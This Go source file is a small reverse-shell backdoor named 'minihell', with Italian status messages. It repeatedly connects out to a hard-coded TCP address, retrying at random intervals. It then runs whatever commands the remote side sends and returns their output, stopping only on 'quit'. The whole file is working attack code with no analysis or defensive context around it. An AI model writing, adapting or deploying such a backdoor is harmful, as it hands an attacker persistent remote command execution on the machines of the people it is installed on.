package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	CONN_HOST = "10.0.2.01:3333"
	CONN_TYPE = "tcp"
	NAME      = "minihell"
)

func main() {
	for {
		r_time := time.Duration(random(1, 360))
		conn, err := net.Dial(CONN_TYPE, CONN_HOST)
		if err != nil {
			time.Sleep(r_time * time.Second)
			continue
		} else {
			conn.Write(to_byte(NAME))
			fmt.Println("Connected...")
			for {
				message, err := bufio.NewReader(conn).ReadString('\n')
				if err != nil {
					time.Sleep(r_time * time.Second)
					break
				}
				if strings.Compare(string(message), "quit\n") == 0 {
					os.Exit(0)
				}
				out, err := exec_cmd(message)
				fmt.Println(len(out))
				if err != nil {
					fmt.Println("Errore")
					err_text := fmt.Sprintf("%s", err)
					conn.Write(to_byte(err_text))
				}
				if len(out) == 0 {
					conn.Write(to_byte("Eseguito"))
				} else {
					conn.Write(out)
				}

			}
		}

	}

}

func random(min, max int) int {
	rand.Seed(time.Now().Unix())
	return rand.Intn(max-min) + min
}

func exec_cmd(command string) ([]byte, error) {
	parts := strings.Fields(command)
	head := parts[0]
	parts = parts[1:len(parts)]
	out, err := exec.Command(head, parts...).Output()
	return out, err
}

func to_byte(f string, args ...interface{}) []byte {
	return []byte(fmt.Sprintf(f, args...))
}
